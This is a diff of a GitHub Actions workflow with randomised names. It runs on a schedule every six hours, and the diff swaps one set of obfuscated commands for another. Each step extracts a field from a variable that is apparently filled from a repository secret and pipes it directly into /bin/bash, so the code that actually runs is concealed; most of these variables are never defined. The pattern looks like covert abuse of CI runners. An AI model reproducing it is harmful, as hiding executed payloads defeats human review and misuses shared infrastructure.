@@ -1,26 +1,29 @@
 name: lanjingtian5614
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '14 5/6 * * *'
+    - cron: '13 4/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: lanjingtian5614
         env:
-          tf95: ${{ secrets.tf95 }}
+          saxqb1919: ${{ secrets.saxqb1919 }}
         run: |
-          echo $tf95 | jq -r .s5 | /bin/bash
-          echo $gk8 | jq -r .px2 | /bin/bash
-          echo $m55950 | jq -r .hyhaw741 | /bin/bash
-          echo $ppan12 | jq -r .cxag0067 | /bin/bash
-          echo $a369 | jq -r .n7 | /bin/bash
-          echo $viv57209 | jq -r .noykc5 | /bin/bash
-          echo $xjlzd086 | jq -r .kcxqk0100 | /bin/bash
-          echo $vrho42915 | jq -r .jxl2 | /bin/bash
-          echo $f2731 | jq -r .ef9646 | /bin/bash
+          echo $saxqb1919 | jq -r .uiokg740 | /bin/bash
+          echo $vwcup11967 | jq -r .ufswj81831 | /bin/bash
+          echo $nnb603 | jq -r .bb98133 | /bin/bash
+          echo $nx40945 | jq -r .k98693 | /bin/bash
+          echo $iocx38116 | jq -r .oc919 | /bin/bash
+          echo $ifgj730 | jq -r .jmm8074 | /bin/bash
+          echo $ogxzt2689 | jq -r .ix7 | /bin/bash
+          echo $gyx8 | jq -r .qp5 | /bin/bash
+          echo $caw411 | jq -r .l81 | /bin/bash
+          echo $aeojb74 | jq -r .oufjl31548 | /bin/bash
+          echo $mtbyy7896 | jq -r .xo4 | /bin/bash
+          echo $ob24 | jq -r .phtgj350 | /bin/bash
+          echo $rycl1983 | jq -r .vltd74954 | /bin/bash
 
